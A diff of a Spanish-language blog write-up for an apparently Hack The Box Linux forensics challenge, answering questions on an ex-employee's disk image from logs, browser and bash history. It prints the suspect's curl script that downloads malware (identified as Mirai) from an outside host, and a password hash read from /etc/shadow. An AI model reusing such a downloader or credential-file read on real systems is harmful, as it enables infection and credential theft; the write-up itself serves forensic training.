@@ -1,8 +1,30 @@
-
-Todos los show pùblicos son actos polìticos
-
-
 ---
+layout: single
+title: Sherlock - Linux_Forensics
+excerpt: Ejercicio sencillo sobre análisis forense en sistemas operativos linux.
+date: 2026-9-23
+classes: wide
+header:
+   teaser: ../assets/images/socs/logoletsdefend.png
+   teaser_home_page: true
+   icon: ../assets/images/hacktheweb.webp
+categories:
+   - hackthebox
+   - soc 
+   - blue team
+   - cloud
+tags: 
+   - linux
+   - forensics
+   - bash
+   - grep 
+   - ping 
+   - bash_history
+   - virus_total
+   - hashing
+---
+
+
 
 **Scenario: An ex-employee, who appears to hold a grudge against their former boss, is displaying suspicious behavior. We seek assistance in uncovering their intentions or plans.**
 
@@ -218,53 +240,160 @@ UUID=4E7A-CA0C  /boot/efi       vfat    umask=0077      0       1
 
 -----------
 
-How many privileged commands did the user run?
+**7\. How many privileged commands did the user run?**
 
-**
+Para esto podemos filtrar con el siguiente comando:
 
-Submit Task
-Task 8
+```bash
+┌──(kali㉿kali)-[/mnt/hackerman]
+└─$ grep -e "hackerman:" -e "hackerman :" var/log/auth.log | wc -l
+14
+```
 
-Hint
-What is the last thing the user searches for in the installed browser?
+---------
 
-*** ** ***** * ****** ** ********* ******* ** ** ****
+**8\. What is the last thing the user searches for in the installed browser?**
 
-Submit Task
-Task 9
+Buscando en el history del navegador:
 
-Hint
-From Q8 we know that the user tried to write a script, what is the script name that the user wrote?
+```bash
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ find .config -name "History" 2>/dev/null
+.config/google-chrome/Default/History
+```
 
-******************.**
+Ahora identificado abrimos con `sqlite3`:
 
-Submit Task
-Task 10
+```bash
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ sqlite3 .config/google-chrome/Default/History                  
 
-Hint
-What is the URL that the user uses to download the malware?
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+cluster_keywords          downloads                 segments                
+cluster_visit_duplicates  downloads_slices          typed_url_sync_metadata 
+clusters                  downloads_url_chains      urls                    
+clusters_and_visits       keyword_search_terms      visit_source            
+content_annotations       meta                      visits                  
+context_annotations       segment_usage           
+sqlite> select * from urls;
+1|https://www.google.com/search?q=hackerman&oq=hackerman&aqs=chrome..69i57j0i512l9.1714j0j4&sourceid=chrome&ie=UTF-8|hackerman - بحث Google|2|0|13327855153321411|0
+2|https://www.google.com/search?q=hackerman&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiSi6z77OD-AhWFhP0HHRqsDWsQ_AUoAXoECAEQAw&biw=1526&bih=732|hackerman - Google Search|2|0|13327855157019447|0
+3|https://www.google.com/search?q=hackerman&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiSi6z77OD-AhWFhP0HHRqsDWsQ_AUoAXoECAEQAw&biw=1526&bih=732#imgrc=cFcd-jpE2QKP6M|hackerman - Google Search|1|0|13327855164666474|0
+4|https://www.google.com/search?q=how+to+write+a+script+to+downlowad+malware+to+my+boss&&tbm=isch&ved=2ahUKEwihyMb87OD-AhUlvicCHVqAA-gQ2-cCegQIABAA&oq=how+to+write+a+script+to+downlowad+malware+to+my+boss&gs_lcp=CgNpbWcQAzoHCAAQigUQQzoFCAAQgAQ6CAgAEIAEELEDOgcIABAYEIAEOgYIABAIEB5QvAdYu_ABYNjxAWgmcAB4AIAB5AGIAcpRkgEGNi43OC4ymAEAoAEBqgELZ3dzLXdpei1pbWewAQDAAQE&sclient=img&ei=Ml1WZKHnFaX8nsEP2oCOwA4&bih=732&biw=1526|how to write a script to downlowad malware to my boss - Google Search|1|0|13327855225493429|0
+5|https://www.google.com/search?q=how+to+write+a+script+to+downlowad+malware+to+my+boss&source=lmns&bih=732&biw=1526&hl=en-US&sa=X&ved=2ahUKEwiZlLSe7eD-AhVLoScCHeoLA8IQ_AUoAHoECAEQAA|how to write a script to downlowad malware to my boss - Google Search|2|0|13327855229563290|0
+```
 
-*****://****.**/************
+Viendo la última línea, el usuario busca `how to write a script to downlowad malware to my boss` 
 
-Submit Task
-Task 11
+-----
 
-Hint
-What is the name of the malware that the user tried to download?
+**9\. From Q8 we know that the user tried to write a script, what is the script name that the user wrote?**
 
-*****
+Leyendo el historial de bash:
 
-Submit Task
-Task 12
+```bash
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ head .bash_history 
+sudo apt update
+touch superhackingscript.sh
+<SNIP>
+```
 
-Hint
-What is the IP address associated with the domain that the user pinged?
+El nombre de `superhackingscript.sh` es bastante sugiriente.
 
-***.***.***.***
+----------
 
-Submit Task
-Task 13
+**10\. What is the URL that the user uses to download the malware?**
 
-Hint
-What is the password hash of the "hackerman" user?
+Buscando el script:
 
+```bash
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ sudo find /mnt/hackerman -name "superhackingscript.sh" 2>/dev/null
+/mnt/hackerman/tmp/superhackingscript.sh
+```
+
+Y al leer su contenido:
+
+```bash
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ cat /mnt/hackerman/tmp/superhackingscript.sh
+#!/bin/bash
+
+# URL of the file to download
+URL="https://mmox.me/supermalware"
+
+# Destination path to save the downloaded file
+DESTINATION="/tmp/ed6baf485cde6e94caa8326b91d323dbc53af58e954520ee55fed80b044c1985"
+
+# Download the file using curl
+curl -o "$DESTINATION" "$URL"
+```
+
+--------
+
+**11\. What is the name of the malware that the user tried to download?**
+
+En la pregunta anterior vimos que se descarta un fichero y se guarda en `/tmp/`, con lo que pareceser un hash. 
+
+Si lo mandamos a VirusTotal veremos que está etiquetado como `mirai`, una familia de malware que convierte dispositivos linux(en su mayoría dispositivos IoT) en bots para realizar ataques DDoS masivos.
+
+-------
+
+**12\. What is the IP address associated with the domain that the user pinged?**
+
+En el `.bash_history` vimos que se edita el `/etc/hosts` para añadir el dominio de `mmox.challenges` y posteriormente hacerle ping:
+
+```bash
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ cat .bash_history                         
+sudo apt update
+touch superhackingscript.sh
+cd ~
+lks
+ls
+touch .secrets
+nano .secrets 
+sudo adduser mmox
+sudo adduser xelessaway
+sudo adduser mohamedhassn
+ls
+ls -lah
+cat .bash_history 
+sudo nano /etc/hosts
+ping mmox.challenges 
+```
+
+Leyendo este fichero:
+
+```bash
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ cat ../../etc/hosts
+127.0.0.1       localhost
+127.0.1.1       HackerMan
+mmox.challenges 185.199.111.153
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+```
+
+-------------
+
+**12\. What is the password hash of the "hackerman" user?**
+
+Esto lo podemos ver en el `/etc/shadows`:
+
+```bash
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
+└─$ sudo cat ../../etc/shadow | grep hackerman
+hackerman:$y$j9T$71dGsUtM2UGuXod7Z2SME/$NvWYKVfU9fSpnbbQNbTXcxCdGz4skq.CvJUqRxyKGx6:19483:0:99999:7:::
+```
